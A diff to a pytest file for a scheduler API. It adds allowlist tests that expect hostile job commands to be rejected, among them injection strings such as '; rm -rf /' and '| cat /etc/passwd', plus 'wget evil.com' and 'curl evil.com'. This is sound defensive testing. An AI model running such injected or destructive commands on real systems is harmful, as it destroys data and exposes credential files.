@@ -35,7 +35,7 @@ async def test_add_job(client, headers):
         "/api/v1/scheduler/jobs",
         json={
             "name": "test",
-            "command": "echo hi",
+            "command": "accel-cmd show stat",
             "interval_seconds": 60,
             "enabled": False,
         },
@@ -50,7 +50,11 @@ async def test_add_job_duplicate(client, headers):
     scheduler.add_job("dup", "echo 1", 60, enabled=False)
     resp = await client.post(
         "/api/v1/scheduler/jobs",
-        json={"name": "dup", "command": "echo 2", "interval_seconds": 60},
+        json={
+            "name": "dup",
+            "command": "accel-cmd show version",
+            "interval_seconds": 60,
+        },
         headers=headers,
     )
     assert resp.status_code == 409
@@ -64,7 +68,11 @@ async def test_add_job_error(client, headers):
     ):
         resp = await client.post(
             "/api/v1/scheduler/jobs",
-            json={"name": "x", "command": "y", "interval_seconds": 60},
+            json={
+                "name": "x",
+                "command": "accel-cmd show stat",
+                "interval_seconds": 60,
+            },
             headers=headers,
         )
     assert resp.status_code == 500
@@ -132,3 +140,65 @@ async def test_run_job_error(client, headers):
 async def test_scheduler_requires_auth(client, bad_headers):
     resp = await client.get("/api/v1/scheduler/jobs", headers=bad_headers)
     assert resp.status_code == 401
+
+
+# ---------------------------------------------------------------------------
+# Command allowlist validation (QA-160726 / DAWOS-01)
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.asyncio
+async def test_add_job_rejects_shell_metachar(client, headers):
+    """Commands with shell metacharacters must be rejected (422)."""
+    for evil in [
+        "accel-cmd show stat; rm -rf /",
+        "accel-cmd show stat | cat /etc/passwd",
+        "accel-cmd show stat && echo pwned",
+        "accel-cmd show stat `whoami`",
+        "accel-cmd show stat $(id)",
+    ]:
+        resp = await client.post(
+            "/api/v1/scheduler/jobs",
+            json={"name": "evil", "command": evil, "interval_seconds": 60},
+            headers=headers,
+        )
+        assert resp.status_code == 422, f"Expected 422 for: {evil}"
+
+
+@pytest.mark.asyncio
+async def test_add_job_rejects_non_allowlisted(client, headers):
+    """Commands not in the allowlist must be rejected (422)."""
+    for cmd in ["echo hello", "rm -rf /", "wget evil.com", "curl evil.com"]:
+        resp = await client.post(
+            "/api/v1/scheduler/jobs",
+            json={"name": "bad", "command": cmd, "interval_seconds": 60},
+            headers=headers,
+        )
+        assert resp.status_code == 422, f"Expected 422 for: {cmd}"
+
+
+@pytest.mark.asyncio
+async def test_add_job_accepts_allowlisted_commands(client, headers):
+    """All allowlisted command prefixes must be accepted."""
+    safe = [
+        "accel-cmd show stat",
+        "accel-cmd show sessions",
+        "uptime",
+        "free -m",
+        "df -h",
+        "ip addr show",
+        "nft list ruleset",
+        "ss -s",
+    ]
+    for i, cmd in enumerate(safe):
+        resp = await client.post(
+            "/api/v1/scheduler/jobs",
+            json={
+                "name": f"safe-{i}",
+                "command": cmd,
+                "interval_seconds": 60,
+                "enabled": False,
+            },
+            headers=headers,
+        )
+        assert resp.status_code == 201, f"Expected 201 for: {cmd}"
